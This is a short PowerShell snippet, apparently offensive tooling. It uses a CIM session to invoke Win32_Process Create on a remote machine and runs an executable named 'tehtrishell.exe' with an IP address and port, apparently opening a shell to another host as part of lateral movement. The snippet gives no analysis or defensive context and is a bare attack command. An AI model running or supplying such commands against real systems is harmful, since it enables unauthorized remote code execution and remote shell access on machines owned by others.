$command = "C:\Windows\tehtrishell.exe 192.168.1.110 2936"
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{Commandline = $command}